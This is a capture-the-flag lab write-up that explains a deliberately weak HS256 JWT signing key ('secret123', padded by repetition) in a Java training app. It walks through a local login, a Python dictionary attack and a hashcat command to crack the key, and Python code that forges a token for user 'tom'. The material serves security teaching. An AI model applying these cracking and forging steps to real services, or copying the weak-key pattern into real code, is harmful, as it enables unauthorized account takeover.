# Level 3 — JWT Token Security

## Challenge Description

This challenge simulates a system that signs JWT Tokens with a weak key. Because the signing key is too simple, attackers can brute force the key offline and then forge JWT Tokens for any user to gain unauthorized access.

**Objective**: Forge a JWT Token for user `tom` and call the user info endpoint to obtain the Flag.

**Hint**: There is a user account called `tom` in the system. Try to gain their privileges by forging a Token.

## Vulnerability Analysis

### JWT Basics

JWT (JSON Web Token) consists of three parts separated by `.`:

```
Header.Payload.Signature
```

- **Header**: Declares the signing algorithm, e.g., `{"alg":"HS256","typ":"JWT"}`
- **Payload**: Contains user data, e.g., `{"username":"admin","role":"ADMIN"}`
- **Signature**: Signs the first two parts with a key to prevent tampering

> Header and Payload are only Base64Url-encoded — **anyone can decode and view them**. Security relies entirely on the Signature.

### Code Logic

The backend code is located in `JwtSecurityController.java`. Key endpoints:

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/challenge/auth-session/jwt/login` | POST | Login and return JWT Token |
| `/api/challenge/auth-session/jwt/user_info` | GET | Validate Token and return user info |

### Data Flow

```
Step 1: Normal login to obtain Token
  POST /jwt/login  {username, password}
    ↓
  Verify credentials → Generate JWT with weak key
    ↓
  Return Token (containing username, role)

Step 2: Brute force the signing key
  Attacker obtains Token → Offline brute force of HS256 key
    ↓
  Use dictionary or tools (hashcat/jwt-cracker) to try common weak keys
    ↓
  Discover key = "secret123" (padded to 32 bytes via padding logic)

Step 3: Forge Tom's Token
  Use the cracked key → Generate JWT with payload {"username":"tom","role":"LEARNER"}
    ↓
  Access /jwt/user_info with forged Token
    ↓
  Server validates signature → Returns Flag
```

### Vulnerability Detail

**Weak key** (`JwtSecurityController.java`, line 41):

```java
// Weak key — intentionally set vulnerability, only 9 characters
private static final String WEAK_SECRET_KEY = "secret123";
```

**Key padding logic** (lines 47-54):

```java
private SecretKey getPaddedKey() {
    // Pad short key to 32 bytes (256 bits)
    StringBuilder paddedKey = new StringBuilder(WEAK_SECRET_KEY);
    while (paddedKey.length() < 32) {
        paddedKey.append(WEAK_SECRET_KEY);  // Repeat concatenation
    }
    return Keys.hmacShaKeyFor(paddedKey.substring(0, 32).getBytes(StandardCharsets.UTF_8));
}
```

Padding result: `secret123secret123secret123secr` (`"secret123"` repeated and truncated to 32 bytes).

HS256 requires a 256-bit key, but padding a short key via repetition does not increase entropy. Attackers only need to brute force the original key `"secret123"` to reconstruct the full key.

**Flag trigger condition** (line 185):

```java
// If username is tom and role is learner, return flag
if ("tom".equalsIgnoreCase(username) && "learner".equalsIgnoreCase(role)) {
    String flag = flagService.getFlag("auth-session", "level3");
    result.put("flag", flag);
    return ResponseEntity.ok(result);
}
```

## Walkthrough

### Step 1: Login to obtain a valid JWT Token

```bash
curl -X POST http://localhost:8080/api/challenge/auth-session/jwt/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"e10adc3949ba59abbe56e057f20f883e"}'
```

> Password must be MD5-hashed before transmission. The MD5 of `123456` is `e10adc3949ba59abbe56e057f20f883e`.

Response:

```json
{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiQURNSU4iLCJpYXQiOjE3NzM1NDEzMzgsImV4cCI6MTc3MzYyNzczOH0.xxxxx"
}
```

### Step 2: Decode and inspect the Token

```python
import base64
token = "eyJhbGci...xxxxx"
header = token.split('.')[0]
payload = token.split('.')[1]

# Add Base64 padding
header_json = base64.urlsafe_b64decode(header + '==')
payload_json = base64.urlsafe_b64decode(payload + '==')

print(f"Header:  {header_json}")
print(f"Payload: {payload_json}")
```

Output:

```json
Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"admin","username":"admin","role":"ADMIN","iat":1773541338,"exp":1773627738}
```

### Step 3: Brute force the signing key

**Method 1: Python script**

```python
import jwt

token = "your_complete_token_here"

# Common weak key dictionary
weak_keys = ['secret', 'secret123', 'password', 'password123', 'admin', '123456', 'key', 'jwt_secret']

def pad_key(key):
    """Reproduce the server's key padding logic"""
    padded = key
    while len(padded) < 32:
        padded += key
    return padded[:32]

for key in weak_keys:
    try:
        padded_key = pad_key(key)
        decoded = jwt.decode(token, padded_key, algorithms=['HS256'])
        print(f"[+] Found key: {key}")
        print(f"[+] Padded key: {padded_key}")
        print(f"[+] Payload: {decoded}")
        break
    except jwt.exceptions.InvalidSignatureError:
        print(f"[-] Tried: {key} - failed")
    except Exception as e:
        pass
```

**Method 2: hashcat**

```bash
# Save JWT to file
echo "eyJhbGci...xxxxx" > jwt.txt

# Brute force with hashcat
hashcat -m 16500 jwt.txt rockyou.txt
```

### Step 4: Forge Tom's Token

```python
import jwt
from datetime import datetime, timedelta

original_key = "secret123"
padded_key = pad_key(original_key)

# Forge a Token for user tom
payload = {
    "sub": "tom",
    "username": "tom",
    "role": "LEARNER",  # Critical: role must be LEARNER
    "iat": int(datetime.now().timestamp()),
    "exp": int((datetime.now() + timedelta(days=1)).timestamp())
}

forged_token = jwt.encode(payload, padded_key, algorithm="HS256")
print(f"Forged Token: {forged_token}")
```

### Step 5: Use the forged Token to obtain the Flag

```bash
curl -X GET http://localhost:8080/api/challenge/auth-session/jwt/user_info \
  -H "Authorization: Bearer <forged_token>"
```

Response:

```json
{
  "success": true,
  "message": "Welcome, tom! You have successfully forged the JWT token.",
  "flag": "flag{...}",
  "user": {
    "username": "tom",
    "role": "LEARNER",
    "email": "tom@madrabbit.com"
  }
}
```

### Step 6: Submit the Flag

Submit the obtained Flag in the challenge's Flag submission box to complete the level.

## Related Files

| File | Description |
|------|-------------|
| `controller/challenge/authsession/JwtSecurityController.java` | Backend JWT endpoint, weak key + padding logic |
| `static/challenges/auth-session/jwt-brute.html` | Frontend challenge page |
| `config/JwtAuthInterceptor.java` | System JWT interceptor (this challenge uses independent validation logic) |
| `service/FlagService.java` | Flag retrieval and validation |
